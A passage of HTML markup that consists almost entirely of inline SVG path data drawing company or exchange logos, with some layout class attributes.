68.7173L10.6325 68.8642ZM25.0806 68.8642C25.0314 69.2072 25.1784 69.6486 24.8851 69.8441C24.7382 69.8927 24.5907 69.9412 24.4929 69.8441L24.4444 69.7458V69.0111L24.3952 68.9626C24.4444 68.9128 24.5907 68.8642 24.689 68.8642L24.5907 68.9626L24.6398 69.6972C24.7376 69.8441 24.8353 69.6972 24.8851 69.6486V68.9128L24.836 68.8157C24.9337 68.7671 25.0314 68.7671 25.1298 68.7173L25.0806 68.8642ZM10.1426 68.8157C10.2403 69.0603 10.2403 69.3056 10.0934 69.5017C9.94645 69.7464 9.65261 69.6972 9.35876 69.6972C9.55425 69.4513 9.4565 69.0603 9.4565 68.7173C9.4565 68.6687 9.40732 68.6687 9.40732 68.6202C9.70179 68.6202 9.99563 68.5704 10.1426 68.8157ZM9.70179 68.7671L9.65261 69.5503C9.75035 69.5503 9.84871 69.5503 9.89789 69.4519C9.99563 69.3062 9.99563 69.0603 9.94707 68.8648C9.89789 68.7671 9.80015 68.7671 9.70179 68.7671ZM11.514 68.9626V69.2073C11.4157 69.1587 11.3671 69.0118 11.2202 69.0603C11.0247 69.2073 11.0733 69.4034 11.1224 69.5988C11.1224 69.6972 11.1716 69.7943 11.2694 69.8447C11.3671 69.8447 11.4157 69.8447 11.514 69.7949V70.0408C11.2694 70.0408 11.0733 69.9923 10.9263 69.7464C10.828 69.5509 10.828 69.2079 10.9749 69.0603C11.0726 68.9134 11.2202 68.8648 11.3671 68.9134C11.4157 68.9128 11.4655 68.9626 11.514 68.9626ZM24.2968 69.1587V69.2073C24.1991 69.1587 24.1499 69.1587 24.0515 69.2073L24.0024 69.2558C24.0515 69.5017 24.0024 69.8441 24.1007 70.0888L23.8069 70.2357C23.9046 69.9412 23.8069 69.5988 23.8561 69.3056C23.7583 69.3056 23.66 69.4513 23.6108 69.5503C23.5616 69.4519 23.6108 69.3548 23.6108 69.2558C23.8069 69.1587 24.0024 69.1089 24.2476 68.9626C24.2968 69.0118 24.2968 69.1089 24.2968 69.1587ZM12.2978 69.5988C12.2486 69.5017 12.1509 69.4034 12.0525 69.4034C12.0034 69.6978 12.0034 70.0402 12.0525 70.2849L11.8072 70.1878C11.8564 69.8933 11.8072 69.5995 11.8564 69.2564C11.7581 69.2564 11.7095 69.2079 11.6111 69.2564V69.061L12.2972 69.3554V69.5988H12.2978ZM23.4639 69.5988C23.4639 69.5503 23.3661 69.5503 23.3169 69.5503C23.259 69.5873 23.2109 69.6379 23.1768 69.6976C23.1428 69.7574 23.1238 69.8246 23.1215 69.8933C23.1215 70.0402 23.1215 70.2363 23.2678 70.2849C23.3661 70.3347 23.4639 70.2363 23.513 70.138V70.3839C23.4153 70.4324 23.2678 70.5308 23.17 70.481C23.0939 70.4487 23.0296 70.3938 22.9858 70.3238C22.9419 70.2538 22.9206 70.1719 22.9247 70.0894C22.8762 69.7949 22.9739 69.5509 23.2678 69.4034C23.3169 69.3548 23.4147 69.4034 23.4639 69.3548V69.5988ZM12.6894 69.5503L12.6402 69.6486V70.3832C12.6402 70.4318 12.738 70.4804 12.7871 70.5302C12.8363 70.5302 12.9341 70.4804 12.9341 70.4318C12.8849 70.1871 12.9826 69.8933 12.8849 69.6486L13.1302 69.7943C13.0324 69.9412 13.081 70.1373 13.081 70.3341C13.081 70.8228 12.6894 70.6758 12.5917 70.5787C12.4933 70.4804 12.4447 70.4318 12.4447 70.2843C12.3956 69.991 12.4939 69.6486 12.3956 69.4027L12.6894 69.5503ZM13.6693 69.9917C13.6693 70.1871 13.7185 70.3347 13.767 70.5302C13.8654 70.3832 13.914 70.2357 13.9631 70.0888C14.0123 70.0888 14.1586 70.0888 14.257 70.1373L14.2078 70.2843L14.257 71.0687V71.1658C14.2078 71.2143 14.0609 71.1658 14.0117 71.1658C13.9625 71.1172 14.0609 71.0687 14.0609 71.0687V70.2843C13.9631 70.5302 13.8654 70.7256 13.8156 70.9211L13.6687 70.8713C13.6687 70.6267 13.5709 70.3826 13.5217 70.1367C13.4725 70.4122 13.4725 70.6942 13.5217 70.9697C13.4234 70.9697 13.3748 70.9211 13.3256 70.9211H13.2765L13.3256 70.8713C13.3748 70.5781 13.3256 70.2357 13.3256 69.9412L13.2765 69.8441L13.6693 69.9917ZM22.6315 69.7943C22.6807 70.0888 22.7784 70.3341 22.8768 70.5787L22.9254 70.6758C22.8276 70.6758 22.7299 70.7742 22.6315 70.7742C22.6807 70.6758 22.6315 70.6273 22.6315 70.5295C22.5338 70.5295 22.436 70.5781 22.3377 70.6267C22.3377 70.725 22.3377 70.8221 22.3868 70.9211C22.2885 70.9697 22.1907 71.0182 22.093 71.0182C22.2399 70.6752 22.2885 70.3334 22.3377 69.991V69.8927C22.436 69.8441 22.5338 69.7943 22.6315 69.7943ZM22.5823 70.3832L22.4846 69.9917L22.3868 70.4318L22.5823 70.3832ZM22.0438 70.1871C22.093 70.2843 22.093 70.4804 21.9946 70.5787C21.9455 70.6758 21.7985 70.6758 21.6516 70.7256C21.6516 70.8713 21.6516 71.0189 21.7008 71.1172C21.6024 71.1658 21.5047 71.1172 21.407 71.1658C21.5047 70.8713 21.4561 70.5302 21.4561 70.1871L21.407 70.0888C21.6522 70.1373 21.8969 69.9419 22.0438 70.1871ZM21.6522 70.1871V70.5787C21.7014 70.5787 21.7992 70.5787 21.7992 70.5302C21.8483 70.4318 21.8483 70.3347 21.8483 70.2843C21.8477 70.1871 21.7008 70.1871 21.6522 70.1871Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M13.7671 60.8823C13.8162 61.4208 13.6693 61.9107 13.3263 62.3509C13.3755 62.4492 13.4732 62.5463 13.5224 62.5955C13.7179 62.5955 13.8654 62.6453 13.9632 62.547C14.1101 62.4499 14.2078 62.547 14.257 62.6453C14.3547 62.6453 14.4033 62.6453 14.5017 62.5955C14.5017 62.6453 14.4531 62.7424 14.4039 62.7424C14.3554 62.7923 14.3554 62.7923 14.3062 62.7923C14.2084 62.8894 14.1593 62.9877 14.0123 62.9379C13.9632 62.8408 13.8654 62.8894 13.7671 62.8894C13.914 63.0363 14.0609 63.1838 14.257 63.2324H14.5509C14.6486 63.281 14.6 63.4279 14.6978 63.4771H14.8441C14.7955 63.624 14.5994 63.5754 14.501 63.6738C14.2564 63.7223 14.1586 63.4771 14.0117 63.4279L13.7664 63.2324C13.7664 63.4771 13.8648 63.6738 14.0117 63.8693C14.1095 63.9178 14.2072 63.9178 14.257 63.9664C14.3547 64.0149 14.257 64.1619 14.4033 64.1619H14.5502C14.4525 64.3088 14.2564 64.2602 14.1586 64.3573C14.0609 64.4071 13.9632 64.3573 13.8648 64.3088C13.8156 64.2117 13.8156 64.1133 13.8156 64.0143C13.571 63.7697 13.4726 63.4273 13.3749 63.134C13.3257 63.1826 13.2771 63.2312 13.3257 63.2797C13.3257 63.3295 13.4234 63.4266 13.3257 63.5256C13.2765 63.5742 13.3257 63.6725 13.3257 63.7211C13.2765 63.6725 13.2279 63.6227 13.1302 63.5742C13.081 63.5742 12.9347 63.4758 13.081 63.2312C13.081 63.0842 13.1794 62.9367 13.2279 62.791C13.2279 62.7412 13.1302 62.6441 13.081 62.5943C12.4933 63.134 11.7587 63.3787 11.0727 63.6725C10.9264 63.7697 10.7303 63.9658 10.6811 64.1612C10.6811 64.2596 10.7303 64.3082 10.828 64.4071C11.4157 64.5541 11.9056 64.0143 12.4933 64.3573C12.8849 64.6032 12.6894 65.2401 13.2279 65.3858C12.9827 65.4842 12.6894 65.6317 12.5917 65.9243C12.5425 66.2188 12.5425 66.6602 12.738 66.9042C13.1788 67.3941 14.1095 66.9042 14.3056 67.6874C14.3056 67.8343 14.3056 67.9818 14.1586 68.0802C14.1592 68.1684 14.137 68.2553 14.0941 68.3324C14.0513 68.4095 13.9892 68.4742 13.914 68.5203L13.7671 68.5689C13.8162 68.4718 13.8654 68.3734 13.8162 68.2757C13.778 68.1883 13.7082 68.1185 13.6208 68.0802C13.6208 68.1773 13.5716 68.3248 13.523 68.4232C13.4247 68.5689 13.2777 68.5689 13.1314 68.6187C13.2292 68.4718 13.2292 68.3728 13.1806 68.2259C13.1806 68.1773 13.1314 68.0802 13.0823 68.0802C12.9845 68.2757 12.7884 68.4718 12.5438 68.5203C12.5929 68.4232 12.6415 68.3248 12.5929 68.1773C12.5929 67.9818 12.2991 68.0304 12.2499 67.8343C12.0538 67.5398 11.76 67.3443 11.4169 67.3941C11.613 67.0997 11.9069 66.8058 11.76 66.4142C11.7108 66.2188 11.5153 66.0227 11.3192 65.9741H11.0254C10.9276 65.6796 10.7315 65.3372 10.4377 65.2881C10.3885 65.2881 10.3885 65.2395 10.3399 65.2881C10.6338 65.6796 10.683 66.3651 10.4377 66.8556C10.2422 67.4427 9.55614 67.5902 9.21312 68.0802C10.8293 67.9818 12.103 68.6672 13.3761 69.3047C13.6214 69.4019 13.9152 69.5002 14.2085 69.5494C14.2576 69.4025 14.2085 69.2549 14.3554 69.2064C14.8447 69.0595 15.4324 69.2064 15.8246 69.5494C16.0207 69.6963 15.9229 69.9908 15.9715 70.1863C16.167 70.2834 16.4123 70.2834 16.6576 70.3817C17.5883 70.4789 18.6659 70.4789 19.5474 70.2834C19.596 70.2348 19.6943 70.2348 19.7429 70.1863C19.7429 69.9908 19.6943 69.7934 19.7921 69.6478C20.2329 69.2549 20.8205 69.0595 21.3597 69.2064C21.506 69.3047 21.4574 69.4019 21.4574 69.5494C22.3389 69.451 23.0244 68.9125 23.8082 68.6193C24.6405 68.2763 25.522 68.031 26.5019 68.0808C26.1103 67.5909 25.3751 67.3948 25.1796 66.7093C25.0327 66.2679 25.0819 65.6809 25.3751 65.2893C25.2742 65.2873 25.1749 65.3137 25.0883 65.3656C25.0018 65.4175 24.9316 65.4926 24.8858 65.5825C24.788 65.7294 24.7389 65.877 24.6897 65.9753C24.445 65.9753 24.1512 66.0239 24.0036 66.2686C23.8567 66.464 23.8567 66.8071 24.0036 67.053L24.2489 67.396C23.9059 67.3462 23.612 67.5915 23.4166 67.8847C23.3188 68.0814 23.025 68.0316 23.0735 68.2775C23.0735 68.3747 23.0735 68.4245 23.1713 68.473C23.0244 68.473 22.8774 68.4245 22.7797 68.2775C22.6813 68.2277 22.6813 68.0821 22.5836 68.0821C22.4367 68.1792 22.4859 68.3753 22.5344 68.5222V68.5708C22.4367 68.6206 22.3383 68.5708 22.2406 68.5222C22.1488 68.3934 22.0976 68.2401 22.0937 68.0821C21.9959 68.0821 21.9467 68.1306 21.8975 68.2277C21.8484 68.2775 21.8484 68.3746 21.8484 68.4736L21.8975 68.5708C21.7506 68.5222 21.5551 68.3753 21.506 68.2277V68.0821C21.4082 67.9837 21.3597 67.7876 21.4082 67.6407C21.6535 66.7591 23.0244 67.5423 23.1227 66.4647C23.1713 66.1216 23.1227 65.7786 22.7797 65.5346C22.6813 65.486 22.5836 65.4375 22.4367 65.3877C22.9752 65.242 22.7797 64.5559 23.3182 64.3107C23.8567 64.066 24.3467 64.6051 24.8858 64.3592C25.0321 64.3106 25.0321 64.2135 25.0321 64.066C24.6897 63.576 24.102 63.5275 23.612 63.233C23.269 63.0375 22.926 62.89 22.6328 62.5961C22.535 62.646 22.4859 62.7431 22.4859 62.7929C22.4859 62.9386 22.5836 63.0861 22.6328 63.2816C22.7305 63.3799 22.682 63.5275 22.5836 63.5275C22.5344 63.6246 22.4367 63.6744 22.3383 63.723C22.3875 63.6744 22.3875 63.6246 22.3875 63.576C22.2891 63.5275 22.2891 63.4291 22.3383 63.3314C22.3875 63.2816 22.3383 63.233 22.3383 63.1845V63.1359C22.2416 63.4673 22.0929 63.7813 21.8975 64.066C21.8975 64.1631 21.8975 64.2615 21.7998 64.3107C21.7021 64.3598 21.6037 64.3592 21.506 64.3592C21.4082 64.2621 21.2121 64.3107 21.1144 64.1637C21.2121 64.1637 21.3099 64.1637 21.3597 64.1152C21.3597 64.0168 21.4574 63.9683 21.506 63.9197C21.5551 63.8711 21.6037 63.9197 21.6529 63.8711C21.7998 63.6757 21.8975 63.4783 21.9467 63.2828H21.8975C21.7506 63.4297 21.5551 63.4783 21.359 63.6258C21.2607 63.6757 21.1629 63.6757 21.0646 63.5773C21.016 63.6258 20.8691 63.5773 20.8199 63.4789C20.8691 63.4789 20.9668 63.5287 21.016 63.4304C21.016 63.3818 21.0646 63.2834 21.1138 63.2349C21.2115 63.1863 21.3092 63.2349 21.359 63.2834C21.4076 63.2834 21.5053 63.2834 21.5545 63.1863C21.6523 63.1378 21.7992 62.9908 21.8969 62.8919C21.75 62.7947 21.6031 63.0388 21.4562 62.8919L21.407 62.7947C21.3565 62.7954 21.3068 62.7819 21.2635 62.756C21.2202 62.7301 21.185 62.6926 21.1617 62.6478V62.598C21.2109 62.598 21.3086 62.6478 21.407 62.6478C21.4562 62.5495 21.5047 62.5495 21.6025 62.5495C21.6516 62.5495 21.7494 62.5495 21.7986 62.598C21.9455 62.598 22.0924 62.6964 22.1901 62.5495L22.3862 62.354C22.0432 61.9624 21.8471 61.4239 21.9455 60.8854C22.2393 60.8854 22.4846 60.8854 22.7785 60.8356C22.7293 61.2284 22.7293 61.6686 22.6801 62.0601C22.6801 62.0601 23.317 61.9145 24.1007 61.5714C24.1499 62.1585 24.4438 62.6484 24.6393 63.139C24.9331 62.8445 25.2755 62.6491 25.57 62.306C26.1576 62.9417 26.7945 63.6277 27.0392 64.4607C27.1375 64.9506 27.1375 65.5377 27.676 65.7824C27.7738 65.8322 27.8721 65.8322 27.9699 65.8322C28.0676 65.8322 28.1168 65.7338 28.1168 65.6852C28.166 65.2451 27.8721 64.9506 27.7252 64.559C27.5297 64.216 27.4806 63.6277 27.7252 63.3345C28.0683 62.8931 28.7537 63.2361 29.0967 62.8445C29.1459 62.7462 29.1951 62.6491 29.2436 62.5501C29.2928 62.7456 29.1944 62.9417 29.1944 63.1384C29.2922 63.0886 29.4391 63.04 29.5375 62.9915L29.8313 62.697C29.586 63.2355 29.6844 64.0187 28.9498 64.1656C28.7537 64.1656 28.5582 64.1656 28.3621 64.117C28.2644 64.117 28.2158 64.1656 28.1666 64.2154V64.3611C28.3621 64.9494 28.9504 65.5371 28.5582 66.1739C28.3621 66.4186 28.0683 66.4672 27.8236 66.4186C27.5789 66.3215 27.3828 66.1739 27.1873 65.9785L27.1382 66.1241C27.089 66.86 27.1873 67.7415 27.8728 68.1331C27.9213 68.1331 28.0191 68.1817 28.0683 68.1817L27.9705 68.28V68.3286C28.3135 68.3771 28.7051 68.3771 29.0475 68.3286L29.0967 70.4832C28.5582 70.5816 27.9705 70.4832 27.4806 70.3861C27.0884 70.6308 26.9414 71.0722 26.5499 71.2178C26.4515 71.2676 26.4515 71.3648 26.5007 71.4637C26.5007 71.5123 26.5499 71.5609 26.5984 71.6107C26.4029 71.6107 26.2068 71.4637 26.1576 71.3162C26.1085 71.2676 26.1085 71.2178 26.1085 71.1207C25.9615 71.1693 25.913 71.3162 25.913 71.4637V71.5609C25.7169 71.5123 25.57 71.2676 25.57 71.0722C25.4722 71.0722 25.3739 71.2178 25.3739 71.3168L25.3247 71.4152C25.1778 71.2185 25.1292 70.7291 25.2755 70.4353L25.3732 70.3382C25.0794 70.3382 24.8347 70.4353 24.5894 70.4838C23.2672 70.8269 22.1901 72.0022 20.7209 71.6598V71.1213C20.574 71.0728 20.4756 71.1699 20.3779 71.2185V72.0514C19.888 72.4928 19.2025 72.4928 18.6149 72.5899H17.1419C16.5194 72.5463 15.9286 72.4256 15.4311 72.1498L15.3334 72.1012V71.2185C15.2357 71.1213 15.1373 71.1213 14.9904 71.0728V71.6598L14.9412 71.7084C14.3535 71.8068 13.7658 71.6598 13.2273 71.4637L11.6597 70.6793C11.2682 70.5336 10.8274 70.3861 10.3374 70.3375C10.5827 70.5822 10.5827 71.0722 10.3866 71.3648V71.4146C10.3374 71.2676 10.2889 71.1201 10.142 71.0217C10.0928 71.1686 10.0928 71.3162 9.99504 71.4146C9.94586 71.4631 9.8973 71.5117 9.79956 71.5602C9.79956 71.4146 9.79956 71.2172 9.65264 71.1201C9.60408 71.3156 9.40735 71.5602 9.16332 71.61H9.11413C9.21187 71.5117 9.26106 71.3641 9.21187 71.267C8.82029 71.0715 8.62419 70.581 8.2326 70.3855C7.74266 70.4826 7.20415 70.581 6.66503 70.4826V68.328C7.00805 68.3765 7.39963 68.3765 7.74266 68.2794L7.6443 68.181C8.0365 68.1325 8.33034 67.7409 8.47727 67.3979C8.62419 66.9565 8.62419 66.4665 8.52645 65.9778L8.2326 66.2711C7.98732 66.418 7.59636 66.4665 7.30189 66.3209C7.20514 66.2486 7.13078 66.1505 7.08738 66.0378C7.04398 65.9251 7.03332 65.8025 7.05661 65.684C7.10579 65.194 7.39963 64.8025 7.59574 64.3125C7.59574 64.2154 7.54656 64.1656 7.498 64.117C7.05723 64.1656 6.61585 64.2154 6.322 63.8724C6.02816 63.5294 6.07734 63.0394 5.93042 62.6964C6.07734 62.941 6.322 63.0394 6.51811 63.1378C6.51811 62.941 6.42037 62.7449 6.46892 62.5495C6.56666 62.7449 6.76277 62.941 6.95887 62.9908C7.35045 63.088 7.79122 62.9908 8.0365 63.3824C8.47727 64.1656 7.69348 64.8025 7.59574 65.5371C7.59574 65.6354 7.59574 65.684 7.6443 65.7817C7.74266 65.8315 7.8404 65.8801 7.93876 65.8315C8.77111 65.5856 8.47727 64.607 8.82029 64.0187C9.16332 63.4316 9.65264 62.8439 10.1426 62.3054C10.4364 62.5986 10.7303 62.8439 11.0727 63.1384C11.2688 62.6484 11.5626 62.1585 11.6118 61.5708C12.0526 61.7663 12.5425 61.9138 12.9833 62.0595C12.9833 61.6679 12.9833 61.2278 12.9347 60.835C13.1794 60.8823 13.4732 60.8325 13.7671 60.8823ZM9.06558 68.4245C8.91865 68.7177 8.96783 69.1093 9.01639 69.4517C9.06558 69.6484 9.21187 69.893 9.40798 69.9416C10.3387 69.9416 11.2202 70.1371 11.9548 70.4801C12.8364 70.8717 13.6201 71.5086 14.6978 71.4114V69.8439C14.2078 69.8924 13.7179 69.7941 13.2771 69.598C11.9548 68.9132 10.6817 68.2277 9.06558 68.4245ZM24.0516 68.816L22.4846 69.5506C22.0438 69.7461 21.5539 69.8937 21.0154 69.8451V71.4127C21.4562 71.4612 21.8477 71.3629 22.2393 71.216L23.7577 70.4814C24.394 70.2367 25.0308 70.0412 25.7163 69.9927C25.9124 69.9429 26.2062 70.0412 26.4023 69.8943C26.4922 69.8482 26.5673 69.7779 26.6193 69.6913C26.6712 69.6047 26.6978 69.5053 26.6962 69.4043C26.7453 69.1099 26.7945 68.7183 26.6476 68.4257C25.763 68.3262 24.8678 68.4608 24.0516 68.816ZM7.93876 68.5708C7.59574 68.6206 7.3019 68.6691 6.95887 68.6691V70.2367C7.20415 70.2367 7.498 70.2367 7.79122 70.1383C8.0365 69.7467 8.13424 69.2082 8.0365 68.7183L7.93876 68.5708ZM27.7738 68.5708C27.5291 69.0607 27.6269 69.7467 27.9207 70.1881C28.2152 70.2367 28.5084 70.2367 28.8029 70.2367V68.6691C28.4107 68.6691 28.1168 68.6206 27.7738 68.5708ZM15.6285 70.3836V71.9512C15.7262 72.0483 15.9223 72.0981 16.0692 72.1467C16.9514 72.3422 17.9792 72.3913 18.9099 72.2438C19.3015 72.1952 19.7423 72.1467 20.0853 71.9008V70.383C19.7915 70.5299 19.4491 70.5785 19.106 70.6277C17.9786 70.7752 16.6563 70.7752 15.6285 70.3836Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M16.3138 70.8719C16.3138 71.0686 16.363 71.2149 16.4116 71.3618C16.4607 71.2149 16.5093 71.0686 16.5093 70.9217C16.6077 70.9217 16.7546 70.9217 16.8523 70.9702L16.8031 71.0686C16.8523 71.4116 16.8031 71.7042 16.8523 71.9987H16.6077C16.6568 71.754 16.6568 71.4116 16.6568 71.1657C16.5591 71.3612 16.4614 71.5573 16.4614 71.8026C16.4614 71.8026 16.3636 71.8026 16.3144 71.754C16.3144 71.5081 16.2167 71.3126 16.1675 71.0679C16.1189 71.3431 16.1189 71.6246 16.1675 71.8997L15.972 71.8026C16.0698 71.5567 16.0212 71.2641 16.0212 70.9696C15.972 70.921 15.972 70.8227 15.972 70.7741L16.3138 70.8719ZM19.7416 70.8233C19.6438 71.0692 19.693 71.4116 19.693 71.7546V71.8032C19.6256 71.8641 19.5385 71.8986 19.4477 71.9003C19.4963 71.6071 19.4963 71.3618 19.4963 71.0686C19.4477 71.3132 19.35 71.5087 19.3008 71.7546C19.2516 71.8032 19.2031 71.8032 19.1539 71.8032C19.1539 71.5573 19.0562 71.3618 19.007 71.1663C19.007 71.4122 18.9578 71.7546 19.0562 71.9993C18.9578 71.9993 18.86 71.9993 18.7623 72.0478C18.86 71.7546 18.8115 71.4122 18.86 71.0692L18.7623 70.9702C18.9092 70.9702 19.0076 70.9702 19.1053 70.9217C19.1545 70.9702 19.1545 71.0686 19.1545 71.1171L19.2523 71.4116C19.3014 71.2149 19.3506 71.0686 19.3506 70.8719C19.4969 70.8719 19.5947 70.8233 19.7416 70.8233ZM17.6361 71.2149C17.5384 71.1178 17.4406 71.1178 17.3423 71.1663V71.4122C17.3915 71.4608 17.4892 71.4608 17.5869 71.4122V71.6077C17.4892 71.5579 17.44 71.5579 17.3423 71.5579V71.9009C17.3915 71.9507 17.5378 71.9507 17.6361 71.9009H17.6853V72.0976C17.4892 72.0976 17.2445 72.0478 17.0484 72.0478C17.0976 71.9507 17.1462 71.8524 17.1462 71.7048C17.097 71.4602 17.1954 71.2149 17.0484 70.9702L17.6361 71.0188V71.2149ZM18.6154 70.9702C18.517 71.2647 18.5662 71.6071 18.517 71.9003C18.517 71.9501 18.4678 72.0472 18.3701 72.097C17.9785 72.1941 17.8802 71.9003 17.8802 71.9003C17.8802 71.6071 17.9293 71.2647 17.831 71.0188H18.1254C18.0277 71.2647 18.0763 71.5573 18.0763 71.8517C18.1254 71.9003 18.174 71.9003 18.2232 71.9501C18.2724 71.9501 18.3701 71.9003 18.4187 71.8517C18.4187 71.5573 18.4187 71.3132 18.3695 71.0686V71.0188C18.4193 70.9702 18.5176 71.0188 18.6154 70.9702ZM41.7319 68.6686C41.7319 68.8156 41.7319 68.9631 41.781 69.0602C41.928 69.3547 42.271 69.4518 42.6134 69.4518C42.8587 69.4518 43.2994 69.3547 43.2994 68.9631C43.2994 68.6686 43.0542 68.5703 42.1241 68.3262C41.2425 68.0816 40.2633 67.8363 40.2633 66.7587C40.2633 65.4856 41.3403 64.947 42.4671 64.947C43.6425 64.947 44.7201 65.3872 44.7687 66.7101H43.1525C43.2017 66.5146 43.1033 66.3671 42.9564 66.2687C42.8095 66.176 42.6401 66.1252 42.4665 66.1218C42.2212 66.1218 41.8302 66.2202 41.8302 66.5146C41.8788 66.9062 42.6626 67.0046 43.4464 67.2007C44.2302 67.3968 44.9648 67.7877 44.9648 68.7683C44.9648 70.1883 43.6917 70.677 42.4671 70.677C41.8309 70.677 40.0678 70.4323 40.0678 68.6693H41.7319V68.6686ZM46.6786 66.4642H45.1111V65.0435H49.8617V66.4642H48.344V70.5301H46.6786V66.4642ZM51.7232 67.7871C51.7232 66.5626 52.3594 66.2687 52.8002 66.2687C53.2409 66.2687 53.8778 66.5632 53.8778 67.7871C53.8778 69.011 53.2409 69.3055 52.8002 69.3055C52.3594 69.3055 51.7232 69.0117 51.7232 67.7871ZM50.0093 67.7871C50.0093 69.4518 51.1355 70.6764 52.8008 70.6764C54.4661 70.6764 55.5437 69.4518 55.5437 67.7871C55.5437 66.1212 54.4661 64.947 52.8008 64.947C51.1355 64.947 50.0093 66.1212 50.0093 67.7871ZM59.7553 67.1011C59.7061 66.9056 59.5592 66.2681 58.8737 66.2681C58.09 66.2681 57.7961 67.0525 57.7961 67.7865C57.7961 68.5205 58.09 69.3049 58.8737 69.3049C59.4123 69.3049 59.6569 68.9121 59.7553 68.3736H61.4206C61.4206 69.501 60.4893 70.6751 58.9223 70.6751C57.1107 70.6751 56.1308 69.402 56.1308 67.7859C56.1308 66.0714 57.2084 64.9458 58.9223 64.9458C60.3921 64.9458 61.2251 65.729 61.3708 67.1004H59.7553V67.1011ZM62.1066 65.0435H63.8199V66.9541L65.3383 65.0435H67.3958L65.4367 67.1994L67.7388 70.5301H65.6328L64.2613 68.3742L63.8199 68.9127V70.5301H62.1066V65.0435ZM69.9906 65.0435H74.4966V66.4642H71.6565V67.1496H74.252V68.424H71.6565V69.1088H74.595V70.5301H69.9906V65.0435ZM76.848 67.6396L75.0837 65.0435H77.0441L77.8758 66.5626L78.6602 65.0435H80.5702L78.8071 67.6396L80.7657 70.5301H78.7088L77.7787 68.9127L76.7982 70.5301H74.8882L76.848 67.6396ZM84.3895 67.1011C84.341 66.9056 84.1941 66.2681 83.508 66.2681C82.6763 66.2681 82.431 67.0525 82.431 67.7865C82.431 68.5205 82.6769 69.3049 83.508 69.3049C84.0478 69.3049 84.2924 68.9121 84.3895 68.3736H86.0069C86.0069 69.501 85.1254 70.6751 83.508 70.6751C81.7449 70.6751 80.7663 69.402 80.7663 67.7859C80.7663 66.0714 81.8433 64.9458 83.508 64.9458C85.0264 64.9458 85.8594 65.729 86.0069 67.1004H84.3895V67.1011ZM86.7895 65.0435H88.4554V66.9541H90.0217V65.0435H91.7356V70.5301H90.0217V68.3742H88.4554V70.5301H86.7895V65.0435ZM94.4306 68.5703L94.9691 66.9056L95.4578 68.5703H94.4306ZM92.1272 70.5301H93.7931L94.0378 69.7457H95.8008L96.0468 70.5301H97.7613L95.8015 65.0442H94.1368L92.1272 70.5301ZM98.2493 65.0435H99.9638L101.531 67.9826H101.58V65.0435H103.148V70.5301H101.531L99.8667 67.5412H99.8169V70.5301H98.2493V65.0435ZM108.045 69.9916C107.702 70.4317 107.115 70.6764 106.478 70.6764C104.861 70.6764 103.882 69.4033 103.882 67.8363C103.882 65.7788 105.351 64.947 106.576 64.947C107.996 64.947 108.877 65.6817 109.122 66.9548H107.506C107.408 66.5632 107.114 66.2687 106.673 66.2687C105.547 66.2687 105.596 67.4933 105.596 67.8849C105.596 68.3748 105.792 69.3061 106.821 69.3061C107.212 69.3061 107.605 69.1094 107.702 68.6693H106.919V67.4933H109.172V70.5307H108.094L108.045 69.9916ZM110.102 65.0435H114.657V66.4642H111.817V67.1496H114.363V68.424H111.817V69.1088H114.706V70.5301H110.102V65.0435Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-2/12 sm:-mr-2 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="111"
              height="26"
              viewBox="0 0 111 26"
              fill="none"
            >
              <g clip-path="url(#clip0)">
                <path
                  d="M0 13.7667L2.41371 0.362305H7.6045C11.4149 0.362305 13.569 2.78668 12.7758 7.19853C11.8658 12.2459 8.88597 13.7667 5.09183 13.7667H0Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M4.4397 10.6409H5.26049C7.06753 10.6409 8.24681 9.56192 8.70425 7.02833C9.2071 4.23492 8.53555 3.49023 6.46735 3.49023H5.72604L4.4397 10.6409Z"
                  fill="#EFF6FE"
                ></path>
                <path
                  d="M25.9684 6.99162C25.146 11.5524 21.9748 14.1224 18.4759 14.1224C14.7645 14.1224 12.753 11.516 13.5755 6.95521C14.3314 2.7469 17.3388 0.00976562 21.0177 0.00976562C25.2385 0.00976562 26.6059 3.45353 25.9684 6.99162Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M17.4443 6.99188C17.1361 8.70467 17.2107 10.8461 19.0664 10.8461C20.7421 10.8461 21.6943 9.20774 22.0933 6.99188C22.421 5.16657 22.1128 3.23204 20.3949 3.28831C18.6366 3.28665 17.7493 5.29731 17.4443 6.99188Z"
                  fill="#EFF6FE"
                ></path>
                <path
                  d="M37.7808 7.76859H37.8132L40.7363 0.364746H44.2271L38.5188 13.7675H34.7085L34.3403 5.98631H34.3078L31.1561 13.7675H27.4965L26.7163 0.364746H30.259L30.7051 7.76859H30.7392L33.7433 0.364746H37.2504L37.7808 7.76859Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M92.6603 12.024C93.481 11.6385 93.9531 10.9037 94.2061 9.50535C95.0853 4.62848 88.0599 5.87624 88.4217 3.86559C88.5092 3.38072 88.9375 3.1027 89.7907 3.1027C90.1687 3.1027 90.5012 3.17717 90.7494 3.34431C90.9992 3.5131 91.1614 3.79278 91.1436 4.25779H94.8225C94.9637 1.90789 93.812 0.00976562 90.5272 0.00976562C87.5717 0.00976562 84.84 1.08046 84.3274 3.93013C83.4061 9.05027 90.1411 7.77437 90.1411 9.83632C90.1411 10.8706 88.3405 10.629 88.3405 10.629C86.1101 10.629 86.308 8.80535 86.308 8.80535H82.595C82.5285 10.1938 82.741 11.0642 83.1676 11.6087C82.6788 11.5972 82.19 11.5867 81.7012 11.5772L81.8618 10.2236H77.3393L77.7189 7.91338H82.1911L82.6015 5.14811H78.2802L78.6257 3.02327H83.2763L83.7386 0.362251H75.3149L73.3051 11.5292L71.5808 11.5425L73.7447 0.362251H70.4891L69.1671 7.00817L66.416 0.363906H62.7857L60.6639 12.1432C59.6955 12.2458 58.7369 12.3633 57.7847 12.4891C59.2446 11.2777 60.346 9.41599 60.7824 6.99162C61.4215 3.45353 60.0524 0.00976562 55.8317 0.00976562C52.1527 0.00976562 49.1469 2.7469 48.3894 6.95356C47.7762 10.3609 48.743 12.6761 50.8177 13.6293C48.962 13.99 47.1517 14.3839 45.3917 14.8059C46.3552 13.2255 46.7397 10.7614 47.1306 8.59187L48.6132 0.362251H44.9391L42.8904 11.5326C42.8904 11.5326 42.5676 13.525 41.4029 